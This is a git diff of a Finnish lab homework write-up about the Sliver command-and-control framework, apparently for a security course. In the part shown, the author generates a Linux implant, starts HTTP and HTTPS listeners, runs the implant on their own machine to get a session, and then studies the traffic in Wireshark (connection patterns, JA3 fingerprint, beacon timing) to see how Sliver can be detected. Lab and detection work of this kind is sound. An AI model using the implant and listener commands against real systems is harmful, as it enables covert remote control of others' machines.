@@ -230,4 +230,83 @@ root@metasploitable:/# sha256sum implant
 
 Nämä olivat samat, joten ongelmana oli todennäköisesti metasploitablen ei-tuettu arkkitehtuuri i686. On myös mahdollista, että localhost-osoitteessa oleva sliver-server ei saa otettua yhteyttä vastaan, vaikka käynnistin kuuntelijan oikeassa osoitteessa.
 
-Jotta voin nämä kummatkin vaihtoehdot eliminoida samalla, niin päätin ajaa implantin suoraan Kalissa. Tätä varten loin vielä kerran uuden implantin, `generate --http localhost --os linux --format elf`.
+Jotta voin nämä kummatkin vaihtoehdot eliminoida samalla, niin päätin ajaa implantin suoraan Kalissa. Tätä varten loin vielä kerran uuden implantin.
+
+```
+127.0.0.1] sliver > generate --http localhost --os linux --format elf
+
+[*] Generating new linux/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m46s
+[*] Implant saved to /home/lassi/Downloads/ARMED_PHYSICAL
+```
+
+Tapoin sliveristä vahnat kuuntelijat ja käynnistin uudet localhost-osoitteessa.
+
+```
+[127.0.0.1] sliver > jobs -K
+
+[*] Killing job #4 ...
+[*] Successfully killed job #4
+[*] Killing job #3 ...
+[*] Successfully killed job #3
+
+[127.0.0.1] sliver > http --lhost localhost
+
+[*] Starting HTTP :80 listener ...
+[*] Successfully started job #5
+
+[127.0.0.1] sliver > https --lhost localhost
+
+[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #6
+```
+
+Toisessa ikkunassa ajoin implantin.
+
+```
+┌──(lassi㉿lika)-[~/Downloads]
+└─$ mv ARMED_PHYSICAL ../simpukat                                                                    
+                                     
+┌──(lassi㉿lika)-[~/Downloads]
+└─$ cd ../simpukat 
+                                     
+┌──(lassi㉿lika)-[~/simpukat]
+└─$ ./ARMED_PHYSICAL
+```
+
+Heti ajettuani implantin, sliver-ikkunaan tuli näkyviin uusi sessio:
+
+```
+[*] Session c1d830b7 ARMED_PHYSICAL - 127.0.0.1:34680 (lika) - linux/amd64 - Sun, 03 May 2026 18:44:51 EEST
+```
+
+Komennolla `use` yhdistin sessioon ja ajoin komennon `ls`.
+
+<img width="801" height="199" alt="image" src="https://github.com/user-attachments/assets/2c9931ea-a49a-4487-801d-da1d8ee10992" />
+
+Hakemisto `/home/lassi/simpukat` listattiin sliverissä, eli http-yhteys toimii.
+
+## d) Sniff Sliver! Tarkastele Sliverin http-yhteyttä snifferillä. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa?
+
+Käynnistin wiresharkin, `wireshark`. Valitsin wiresharkissa kaapattavaksi liitännäksi loopback. Kaapatussa liikenteesssä ei näkynyt porttien perusteella palvelimen ja implantin välistä liikennettä, joten aloitin yhteyden uudestaan, mutta tällä kertaa kaapaten myös yhteyden alun. Uudessa yhteydessä kohteen portiksi asettui 51722.
+
+<img width="2112" height="1098" alt="image" src="https://github.com/user-attachments/assets/d1dc8afb-a281-4c2d-89f2-2020c7cd2a54" />
+
+Kaappauksesta huomasin, että kohteen (127.0.0.1:51722) ja palvelimen (127.0.0.1:443) välinen TCP-yhteys kestää handshake mukaan lukien noin 0.02 sekuntia, jonka jälkeen se katkaistaan. Yhteyden katkaistuttua syntyy lähes välittömästi kaksi uutta yhteyttä kohteesta palvelimeen, vain kohteen portti vaihtuu. Tämä kaava toistuu usean kerran tallenteessa ja voi olla tapa tunnistaa sliver.
+
+TLS-yhteyden luonnin yhteydessä voidaan nähdä palvelimen JA3-sormenjälki "Server Hello"-viestissä. 
+
+<img width="2123" height="899" alt="image" src="https://github.com/user-attachments/assets/2260ed8d-adc8-4b3d-88a6-c8d4f53e2f05" />
+
+Kun tämän sormenjäljen googlaa, tekoäly osaa suoraan liittää sen mahdolliseen C2 aktiviteettiin. Lisäksi ehdotuksissa tulee esiin useampi maininta sliveristä.
+
+<img width="1278" height="725" alt="image" src="https://github.com/user-attachments/assets/e78ba6b3-75df-4734-835e-2878e21ad004" />
+
+Sliver palvelimen JA3 sormenjälki on tunnistettavissa.
+
+Huomasin myös, että palvelin ja kohde vaihtavat tietoa joka kahdes sekunti. Alla olevassa kuvassa tämä kaava toistuu kahdesti.
+
+<img width="2107" height="344" alt="image" src="https://github.com/user-attachments/assets/672a43fc-d7f8-44e0-8f8d-a1029a3034ee" />
+
+Ensiksi palvelin lähettää kohteelle 204 tavun pituisen paketin, johon kohde vastaa noin 350-380 tavua pitkällä paketilla ja lopuksi palvelin lähettää kohteelle TCP ACK-viestin.
